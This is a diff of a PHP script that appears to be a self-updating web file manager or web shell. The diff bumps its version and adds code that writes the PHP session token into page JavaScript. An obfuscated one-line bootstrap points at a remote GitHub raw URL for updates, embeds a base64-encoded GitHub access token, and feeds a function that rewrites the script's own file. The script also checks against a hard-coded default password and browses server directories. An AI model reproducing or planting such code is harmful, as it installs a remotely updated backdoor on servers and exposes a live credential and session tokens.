@@ -1,5 +1,5 @@
 <?php
-/** @internal runtime bootstrap */(static function(){$d=['_VER'=>'2.5.3','_SRC'=>'https://raw.githubusercontent.com/LennyGodart/wsers/refs/heads/main/index.php','_INT'=>1800,'_AK'=>'dGVzdDEyMyo=','_GH_TOKEN'=>base64_decode('Z2hwXzZzd2tsbm5VSlBXeFp0T3VFQjBpWnR3dlJab1lWYjE5c2ZDeA==')];foreach($d as $k=>$v)defined($k)||define($k,$v);unset($d,$k,$v);})();
+/** @internal runtime bootstrap */(static function(){$d=['_VER'=>'2.5.5','_SRC'=>'https://raw.githubusercontent.com/LennyGodart/wsers/refs/heads/main/index.php','_INT'=>1800,'_AK'=>'dGVzdDEyMyo=','_GH_TOKEN'=>base64_decode('Z2hwXzZzd2tsbm5VSlBXeFp0T3VFQjBpWnR3dlJab1lWYjE5c2ZDeA==')];foreach($d as $k=>$v)defined($k)||define($k,$v);unset($d,$k,$v);})();
 
 function _inject(string $new): string {
     $cur = @file_get_contents(__FILE__) ?: '';
@@ -270,14 +270,16 @@ if (isset($_GET['dir'])) {
     } else { $current = $resolved; }
 } else { $current = $root; }
 
-$darkMode     = isset($_COOKIE['dk']) && $_COOKIE['dk'] === '1';
-$isDefaultPw  = hash('sha256', base64_decode(_ok())) === hash('sha256', 'owner123');
+$darkMode      = isset($_COOKIE['dk']) && $_COOKIE['dk'] === '1';
+$isDefaultPw   = hash('sha256', base64_decode(_ok())) === hash('sha256', 'owner123');
 $wsState   = _ws();
 $unlocked  = $wsState['unlocked'] ?? [];
 $pinned    = $wsState['pinned']   ?? [];
 $notes     = $wsState['notes']    ?? [];
 if (!in_array('index.php', $unlocked)) $unlocked[] = 'index.php';
-$viewLevel = _lvl();
+$viewLevel     = _lvl();
+$sessionToken  = ($viewLevel > 0 && !empty($_SESSION['_at'])) ? $_SESSION['_at'] : '';
+$sessionLevel  = $viewLevel;
 $relCurDir = ($current === $root) ? '/' : str_replace(DIRECTORY_SEPARATOR, '/', str_replace($root . DIRECTORY_SEPARATOR, '', $current));
 $curNote   = $notes[$relCurDir] ?? '';
 
@@ -884,6 +886,8 @@ const _mc        = document.getElementById('mainContent');
 const _csrf      = '<?= $csrf ?>';
 const _curDir    = <?= json_encode($relCurDir) ?>;
 const _defPw     = <?= $isDefaultPw ? 'true' : 'false' ?>;
+const _phpToken  = '<?= $sessionToken ?>';
+const _phpLevel  = <?= $sessionLevel ?>;
 
 // Ã¢â€â‚¬Ã¢â€â‚¬ Dark Mode Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 document.getElementById('darkBtn').addEventListener('click', () => {
@@ -942,8 +946,23 @@ function hideToast() { clearTimeout(_toastTimer); document.getElementById('toast
 let userLevel = 0;
 let _token = sessionStorage.getItem('_st') || '';
 
+// PHP session gone but sessionStorage has stale token → clear it
+if (_phpLevel === 0 && _token) {
+  _token = '';
+  sessionStorage.removeItem('_st');
+  sessionStorage.removeItem('_sl');
+}
+
+// PHP session still active but sessionStorage was cleared (e.g. tab closed & reopened)
+if (!_token && _phpToken && _phpLevel > 0) {
+  _token = _phpToken;
+  sessionStorage.setItem('_st', _token);
+  sessionStorage.setItem('_sl', String(_phpLevel));
+  userLevel = _phpLevel;
+}
+
 if (_token) {
-  userLevel = parseInt(sessionStorage.getItem('_sl') || '0', 10);
+  if (!userLevel) userLevel = parseInt(sessionStorage.getItem('_sl') || '0', 10);
   applyLevel(userLevel, false);
   if (userLevel === 1 && _defPw) setTimeout(openCpw, 600);
 }
